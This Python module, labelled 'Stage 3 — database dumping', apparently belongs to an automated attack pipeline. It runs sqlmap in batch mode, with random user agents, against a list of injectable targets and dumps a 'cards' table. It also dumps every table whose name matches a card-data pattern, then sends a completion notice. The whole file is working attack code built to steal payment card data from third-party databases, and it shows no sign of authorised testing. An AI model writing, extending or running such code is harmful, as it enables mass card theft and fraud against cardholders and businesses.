"""Stage 3 — database dumping. enumerate dbs, tables, columns, extract card data."""
from pathlib import Path
import re
from modules.utils import run, which
from modules.notifier import Notifier


class Dumper:
    def __init__(self, cfg, logger):
        self.cfg = cfg
        self.log = logger
        self.raw = Path(cfg["paths"]["raw"])
        self.dumps = Path(cfg["paths"]["dumps"])
        self.rc = cfg["dump"]
        self.sq = cfg["sqli"]

    def _base_cmd(self, targets_file: Path):
        cmd = [
            self.sq["sqlmap_bin"],
            "-m", str(targets_file),
            "--batch",
            f"--output-dir={self.dumps}",
        ]
        if self.sq.get("random_agent"):
            cmd.append("--random-agent")
        return cmd

    def run(self):
        targets_file = self.raw / "injectable.txt"
        if not targets_file.exists() or not targets_file.read_text().strip():
            self.log.error("[dumper] no injectable.txt")
            return

        if not which(self.sq["sqlmap_bin"]):
            self.log.error("[dumper] sqlmap not found")
            return

        self._dump_db()
        self._dump_tables()

        Notifier(self.cfg, self.log).send(
            "*[dump done]* — check data/dumps/",
            stage="dump"
        )

    def _dump_db(self):
        cmd = self._base_cmd(self.raw / "injectable.txt")
        cmd.append(f"-D{self.rc['target_db']}")
        cmd.append("-Tcards")
        cmd.append("--dump")
        for col in self.rc["dump_columns"]:
            cmd.append(f"-C{col}")
        self.log.info(f"[dumper] dumping {self.rc['target_db']}.cards")
        rc, out, err = run(cmd, logger=self.log)
        self.log.info(f"[dumper] dump rc={rc}")

    def _dump_tables(self):
        # discover tables matching card pattern
        cmd = self._base_cmd(self.raw / "injectable.txt")
        cmd.append(f"-D{self.rc['target_db']}")
        cmd.append("--tables")
        rc, out, err = run(cmd, logger=self.log)
        if rc != 0:
            return
        pattern = re.compile(self.rc["card_tables_regex"], re.I)
        tables = [t.strip() for t in out.splitlines() if pattern.search(t)]
        self.log.info(f"[dumper] matched {len(tables)} card-bearing tables")

        for table in tables:
            cmd = self._base_cmd(self.raw / "injectable.txt")
            cmd.append(f"-D{self.rc['target_db']}")
            cmd.append(f"-T{table}")
            cmd.append("--dump")
            self.log.info(f"[dumper] dumping table: {table}")
            run(cmd, logger=self.log)
